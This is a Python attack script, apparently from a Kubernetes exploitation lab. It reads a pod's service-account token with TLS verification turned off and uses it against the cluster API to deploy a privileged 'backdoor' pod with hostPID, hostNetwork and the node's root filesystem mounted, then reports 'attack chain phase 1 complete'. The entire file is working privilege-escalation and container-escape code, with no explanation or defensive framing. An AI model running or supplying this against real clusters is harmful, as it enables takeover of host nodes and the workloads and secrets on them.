import urllib.request, ssl, json, os, time, sys

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
APISERVER = "https://kubernetes.default.svc"

with open("/var/run/secrets/kubernetes.io/serviceaccount/token") as f:
    token = f.read().strip()

def api_request(method, path, data=None):
    url = APISERVER + path
    req = urllib.request.Request(url, method=method)
    req.add_header("Authorization", "Bearer " + token)
    req.add_header("Content-Type", "application/json")
    if data:
        req.data = json.dumps(data).encode()
    resp = urllib.request.urlopen(req, context=ctx)
    return json.loads(resp.read())

print("[1] Checking permissions...")
try:
    pods = api_request("GET", "/api/v1/namespaces/default/pods")
    print(f"  Can list pods: {len(pods.get('items', []))} pods found")
except Exception as e:
    print(f"  Cannot list pods: {e}")
    sys.exit(1)

print("[2] Deploying backdoor pod...")
backdoor = {
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "backdoor", "namespace": "default"},
    "spec": {
        "containers": [{
            "name": "backdoor",
            "image": "k8s-arsenal-pod:latest",
            "command": ["sleep", "3600"],
            "imagePullPolicy": "Never",
            "securityContext": {"privileged": True},
            "volumeMounts": [{"name": "host", "mountPath": "/host"}]
        }],
        "hostPID": True,
        "hostNetwork": True,
        "volumes": [{"name": "host", "hostPath": {"path": "/"}}],
        "restartPolicy": "Never"
    }
}
try:
    result = api_request("POST", "/api/v1/namespaces/default/pods", backdoor)
    print(f"  Backdoor pod created: {result['metadata']['name']}")
except Exception as e:
    print(f"  Failed: {e}")
    sys.exit(1)

print("[3] Waiting for backdoor pod to be running...")
for i in range(20):
    time.sleep(3)
    try:
        pod = api_request("GET", "/api/v1/namespaces/default/pods/backdoor")
        if pod["status"].get("phase") == "Running":
            print(f"  Backdoor pod is running after {(i+1)*3}s")
            break
    except:
        pass
else:
    print("  Timeout waiting for backdoor pod")

print("[+] Attack chain phase 1 complete. Backdoor pod deployed.")
